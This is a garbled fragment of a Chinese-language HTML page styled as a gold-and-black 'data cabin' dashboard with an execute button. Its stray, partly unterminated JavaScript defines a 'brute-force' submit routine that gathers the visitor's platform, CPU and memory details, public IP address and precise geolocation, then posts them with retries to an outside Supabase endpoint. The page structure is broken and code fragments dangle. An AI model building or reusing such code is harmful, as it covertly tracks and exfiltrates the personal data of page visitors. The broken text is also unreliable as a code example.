<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>▣ 黑曜数据舱 - 朱子硕 ▣</title>
    <style>
        :root {
            --钨金黑: #0a0a0a;
            --淬火金: #d4af37;
            --合金纹: linear-gradient(145deg, 
                rgba(212,175,55,0.1) 0%,
                transparent 50%,
                rgba(212,175,55,0.1) 100%
            );
        }

        body {
            background: 
                radial-gradient(circle at 50% 0%, 
                    rgba(212,175,55,0.05) 0%, 
                    var(--钨金黑) 70%
                ),
                var(--钨金黑);
            min-height: 100vh;
            margin: 0;
            font-family: 'Noto Serif SC', serif;
            color: #d4af99;
            overflow-x: hidden;
        }

        /* 钣金材质面板 */
        .analysis-panel {
            margin: 2rem;
            padding: 2rem;
            background: 
                linear-gradient(45deg, #1a1a1a 0%, #2d2d2d 100%),
                repeating-linear-gradient(
                    45deg,
                    transparent 0px,
                    transparent 15px,
                    rgba(212,175,55,0.05) 16px
                );
            border: 2px solid;
            border-image: linear-gradient(
                to bottom right,
                var(--淬火金) 0%,
                #9c8412 50%,
                transparent 100%
            ) 1;
            box-shadow: 0 12px 30px rgba(0,0,0,0.5);
        }

        /* 数据卡浮雕效果 */
        .data-card {
            padding: 1.5rem;
            margin: 1.5rem 0;
            background: rgba(10,10,10,0.9);
            border-left: 5px solid var(--淬火金);
            position: relative;
            transition: transform 0.3s;
        }
        .data-card:hover {
            transform: translateX(10px);
        }
        .data-card::after {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--合金纹);
            pointer-events: none;
        }

        /* 命令按钮 */
        #executeBtn {
            width: 300px;
            height: 60px;
            margin: 2rem auto;
            display: block;
            background: 
                linear-gradient(90deg, 
                    var(--淬火金) 0%, 
                    #9c8412 100%
                );
            border: none;
            color: #000;
            font-size: 1.2em;
            letter-spacing: 3px;
            clip-path: polygon(10% 0, 90% 0, 100% 50%, 90% 100%, 10% 100%, 0 50%);
            transition: 
                filter 0.3s,
                box-shadow 0.3s;
        }
        #executeBtn:active {
            filter: brightness(1.2);
            box-shadow: 0 0 30px rgba(212,175,55,0.5);
        }

        /* 专属于你的标识 */
        .operator-sigil {
            position: fixed;
            bottom: 30px;
            right: 30px;
            font-size: 1.1em;
            background: linear-gradient(90deg, #d4af37, #9c8412);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
    </style>
</head>

    </div>

// 暴力回传协议（无视任何错误）
const 暴力提交 = async (数据) => {
  for(let 重试次数=0; 重试次数<5; 重试次数++){
    try {
      const 响应 = await fetch(`${SUPABASE_ENDPOINT}/rest/v1/analytical_records`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'apikey': SUPABASE_KEY,
          'Authorization': `Bearer ${SUPABASE_KEY}`
        },
        body: JSON.stringify({
          device_footprint: {
            平台: navigator.platform,
            核心数: navigator.hardwareConcurrency,
            内存: navigator.deviceMemory || '未知'
          },
          network_fingerprint: {
            IP: await (async () => {
              try {
                const 响应 = await fetch('https://api.ipify.org?format=json');
                return (await 响应.json()).ip;
              } catch {
                return '受保护';
              }
            })()
          },
          geo_matrix: await new Promise(解决 => {
            navigator.geolocation.getCurrentPosition(
              位置 => 解决({
                纬度: 位置.coords.latitude,
                经度: 位置.coords.longitude
              }),
              () => 解决(null)
            )
          })
        })
      });
      if(响应.ok) return true;
    } catch(错误) {
      await new Promise(解决 => setTimeout(解决, 2000));
    }
  }
  throw new Error('终极传输失败');
};

    alert('启动应急模式，请截图此提示联系管理员');
  } finally {
    按钮.disabled = false;
  }
};
